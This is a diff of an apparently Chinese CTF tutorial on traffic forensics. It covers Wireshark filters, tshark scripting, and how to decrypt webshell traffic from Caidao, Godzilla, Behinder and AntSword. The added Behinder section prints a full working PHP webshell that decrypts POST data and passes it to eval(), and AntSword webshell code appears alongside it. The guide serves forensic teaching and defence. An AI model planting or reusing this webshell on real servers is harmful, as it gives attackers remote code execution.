@@ -5,17 +5,19 @@
 
 &lt;!--more--&gt;
 
-拿到流量包后，第一件事就是可以先 strings | grep flag{ 一下，说不定 flag 就直接出了
+拿到流量包后，第一件事就是可以先 `strings | grep flag{` 一下，说不定 flag 就直接出了
 
-当然也可以使用凤二西师傅的 破空_flag查找工具3.5.exe 来搜索 flag
+当然也可以使用`@凤二西`师傅的 `破空_flag查找工具3.5.exe` 来搜索 flag
 
 ## WireShark基础
 
-刚刚接触流量分析的同学可能会不太清楚 wireshark 的过滤器如何使用
+刚刚接触流量分析的同学，看到`Wireshark`中密密麻麻的流量包和字段可能会感觉无从下手
 
-但是用熟悉了其实很简单
+但是其实我们要明白一点就是，流量分析的第一步就是过滤，把流量包过滤到我们能掌控的范围内，然后再逐个分析
 
-常见的协议比如 http ，常用的有下面这些参数，其实只要在过滤器中输入 http. 它就会自动提示你了
+`wireshark`的过滤器其实上手很简单，用熟悉了以后会给人一种非常顺手的感觉
+
+常见的协议比如`http`，常用的有下面这些参数，其实只要在过滤器中输入`htt`. 它就会自动提示你后面的字段了
 
 ```
 http.request.method == &#34;POST&#34;
@@ -23,7 +25,7 @@ http.request.full_uri == “XXX”
 ......
 ```
 
-还有一些比较常用的
+除了协议以外，还有一些比较常用的
 
 ```bash
 # 包含什么内容的帧
@@ -35,8 +37,6 @@ frame contains &#34;XXX&#34;
 有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了
 
 ![](imgs/N1.png)
-
-
 
 ## tshark使用教程
 
@@ -54,6 +54,48 @@ tshark -r 1.pcapng -Y &#34;http.request.method == POST&#34; -T fields -e data.da
 ```bash
 # uinq：去除重复行
 # sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）
+```
+
+在我们清楚了tshark的相关命令后，我们就可以尝试编写Python脚本来调用tshark进行流量包的处理了
+
+这种用法通常在我们分析较大流量包并且需要频繁复制里面的数据的时候比较实用
+
+```python
+import json
+import subprocess
+
+output = &#34;&#34;
+file_path = &#34;&#34; # 流量包的路径
+command = [
+	&#34;tshark&#34;,  # tshark的路径，如果在环境变量里这里就不用改
+	&#39;-r&#39;, file_path,  # 读取指定的 pcapng 文件
+	&#39;-Y&#39;, &#39;http&#39;,  # 过滤出 HTTP 数据包
+	&#39;-T&#39;, &#39;json&#39;,  # 输出为 JSON 格式
+	&#39;-e&#39;, &#39;http.request.method&#39;,  # 请求方法
+	&#39;-e&#39;, &#39;http.host&#39;,  # 请求主机
+	&#39;-e&#39;, &#39;http.request.uri&#39;,  # 请求 URI
+	&#39;-e&#39;, &#39;http.user_agent&#39;,  # 用户代理
+	&#39;-e&#39;, &#39;http.file_data&#39;,  # 请求中的文件数据（POST 请求的内容）
+	&#39;-e&#39;, &#39;http.response.code&#39;,  # 响应代码
+	&#39;-e&#39;, &#39;http.response.phrase&#39;,  # 响应短语
+	&#39;-e&#39;, &#39;http.content_type&#39;  # 响应内容类型
+]
+result = subprocess.run(
+    command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+json_output = json.loads(result.stdout)
+# print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除
+
+# 遍历 JSON 数据并提取字段
+for packet in json_output:
+    layers = packet.get(&#39;_source&#39;, {}).get(&#39;layers&#39;, {})
+    request_method = layers.get(&#39;http.request.method&#39;, [&#39;None&#39;])[0]
+    request_host = layers.get(&#39;http.host&#39;, [&#39;None&#39;])[0]
+    request_uri = layers.get(&#39;http.request.uri&#39;, [&#39;None&#39;])[0]
+    user_agent = layers.get(&#39;http.user_agent&#39;, [&#39;None&#39;])[0]
+    file_data = layers.get(&#39;http.file_data&#39;, [&#39;None&#39;])[0]
+    response_code = layers.get(&#39;http.response.code&#39;, [&#39;None&#39;])[0]
+    response_phrase = layers.get(&#39;http.response.phrase&#39;, [&#39;None&#39;])[0]
+    content_type = layers.get(&#39;http.content_type&#39;, [&#39;None&#39;])[0]
 ```
 
 ## 流量分析基础考点
@@ -330,23 +372,28 @@ if __name__ == &#34;__main__&#34;:
 
 ## Webshell流量分析
 
-Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip数据一般是以 1F 8B 08 00 开头的
+Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip的文件头是`1F 8B 08 00`
 
 ### 菜刀流量分析
 
-在TCP和HTTP协议中寻找线索，找返回包中一大串的数据，并根据标志位判断文件类型
-如果是加密了的压缩包，看看是不是伪加密
+菜刀流量的一个明显的特征就是，响应里可能有 `-&gt;|      |&lt;-` 这样的字符串
+
+![](imgs/image-20250419164405745.png)
+
+流量分析和解密上没啥难度，一般就是简单的明文流量或者就Base64编码了一下
 
 ### 哥斯拉流量分析
 
 &gt; 哥斯拉的默认密钥为：3c6e0b8a9c15224a
 
-然后编码器函数如下所示，就是简单的异或
+哥斯拉流量一般的加密方式就是异或，当然在插件的加持下可能也会用到AES
+
+然后如果是异或的话，编码器的函数如下所示，就是这里要注意把密钥的最后一位放到最后
 
 ```php
 function encode($D,$K){
     for($i=0;$i&lt;strlen($D);$i&#43;&#43;) {
-        $c = $K[$i&#43;1&amp;15];
+        $c = $K[$i&#43;1&amp;15]; // 要注意把密钥的最后一位放到最后
         $D[$i] = $D[$i]^$c;
     }
     return $D;
@@ -398,18 +445,125 @@ echo substr(md5($pass.$key),16);
 
 ![](imgs/image-20250226143429376.png)
 
+### 冰蝎流量分析
+
+&gt; 冰蝎的默认密钥为：e45e329feb5d925b（md5(rebeyond)的前16位）
+
+冰蝎流量的加密方式主要包括异或和AES，异或加密的话是和哥斯拉一样的
+
+具体的加密代码如下所示：
+
+```php
+&lt;?php
+@error_reporting(0);
+session_start();
+	// $key=&#34;e45e329feb5d925b&#34;; // 默认密钥
+    $key=&#34;5b4582c9d56b5b33&#34;;
+	$_SESSION[&#39;k&#39;]=$key;
+	$post=file_get_contents(&#34;php://input&#34;);
+	if(!extension_loaded(&#39;openssl&#39;))
+	{
+		$t=&#34;base64_&#34;.&#34;decode&#34;;
+		$post=$t($post.&#34;&#34;);
+		
+		for($i=0;$i&lt;strlen($post);$i&#43;&#43;) {
+    			 $post[$i] = $post[$i]^$key[$i&#43;1&amp;15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, &#34;AES128&#34;, $key);
+	}
+    $arr=explode(&#39;|&#39;,$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p.&#34;&#34;);}}
+    @call_user_func(new C(),$params);
+?&gt;
+```
+
+#### xor_base64
+
+异或的情况和哥斯拉的有点像，把密钥的第一位放到最后一位然后解密即可
+
+![](imgs/image-20250419164124175.png)
+
+#### AES_base64
+
+当加密器用的是AES加密的时候就需要注意了
+
+可能会有两种情况，一种是AES-EBC（没有IV），一种是AES-CBC（有IV）
+
+然后这里如果有IV，IV也可能有以下两种情况
+
+```
+IV = 0123456789abcdef
+IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+```
+
+反正不管是哪种加密，都可以用CyberChef试一试，看看哪一种可以正常解出来就行
+
+![](imgs/N3.png)
+
+![](imgs/N4.png)
+
+当然，这里如果想要偷懒，对于冰蝎和哥斯拉流量也可以用`@风二西`师傅的`承影_哥斯拉冰蝎解码工具`辅助解密
+
+直接将木马中的密钥复制到工具中，然后 Ctrl&#43;A 全选加密的数据，再右键选择对应的解密方式即可
+
+![](imgs/N5.png)
+
+最后，如果遇到数据量比较庞大的流量分析的时候，可能会需要用到脚本解密批量的情况
+
+这里我就放几个比较简单的解密脚本
+
+```python
+# XOR
+import base64
+key = &#34;e45e329feb5d925b&#34;
+
+def decrypt_xor(ciphertext_base64):
+    ciphertext = base64.b64decode(ciphertext_base64)
+    key_stream = (key[(i&#43;1)%len(key)] for i in range(len(ciphertext)))
+    decrypted = bytes([a ^ ord(b) for a, b in zip(ciphertext, key_stream)])
+    return decrypted
+```
+
+```python
+# AES-CBC
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import base64
+
+key = &#34;5b4582c9d56b5b33&#34;
+key = key.encode(&#39;utf-8&#39;).ljust(16, b&#39;\x00&#39;)  # 默认填充到16字节(AES-128)
+iv = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
+
+def decrypt_aes_cbc(ciphertext_base64):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = base64.b64decode(ciphertext_base64)
+    decrypted = cipher.decrypt(ciphertext)
+    return decrypted
+```
 
 ### 蚁剑流量分析
 
-蚁剑流量分析需要注意的地方：
+蚁剑流量因为支持多种编码器，然后Github上也有很多[开源的编码器]()
+
+&gt; 1、 https://github.com/lowliness9/AntSwordEncoder
+&gt; 
+&gt; 2、 https://github.com/AntSwordProject/AwesomeEncoder
+
+因此流量的分析和解密上就会稍微复杂一点
+
+这里我稍微写一下蚁剑流量分析需要注意的地方：
 
 1、路径base64字符串需要去除前两个字符后再解码
 
 2、响应数据的头尾有额外的字符，需要先去除然后再base64解码
 
-蚁剑webshell样本
-
 ```php
+// 蚁剑webshell一个比较简单的例子
 &lt;?php
 // 设置一些PHP配置
 @ini_set(&#34;display_errors&#34;, &#34;0&#34;); // 关闭显示错误信息
@@ -521,41 +675,6 @@ function asoutput()
 3、根据gzip的文件头提取响应包，去除标识字符串后base64解码得到响应数据
 
 4、按照上面的步骤逐个分析流量包
-
-### 冰蝎流量分析
-
-冰蝎的默认密钥为：e45e329feb5d925b（md5(rebeyond)的前16位）
-
-#### xor_base64
-
-
-#### AES_ECB
-
-简要加密过程（请求）
-
-base64 -&gt; AES(key = ？？？ IV = 0123456789abcdef) -&gt; base64
-有时候 IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
-简要解密过程（响应）
-
-解密过程反过来即可
-
-从流量包中的HTTP数据包中获取key和data，然后用CyberChef解密即可
-
-![](imgs/N2.png)
-
-
-
-![](imgs/N3.png)
-
-
-
-![](imgs/N4.png)
-
-这里如果想要偷懒，对于冰蝎和哥斯拉流量可以直接用 风二西 师傅的 承影_哥斯拉冰蝎解码工具 一把梭了
-
-直接将木马中的密钥复制到工具中，然后 Ctrl&#43;A 全选加密的数据，再右键选择对应的解密方式即可
-
-![](imgs/N5.png)
 
 ### CobalStrike流量分析
 
@@ -845,7 +964,6 @@ if __name__ == &#34;__main__&#34;:
 ```
 
 例题1-2024西湖论剑初赛-cscs
-
 
 ## NTLM流量分析
 
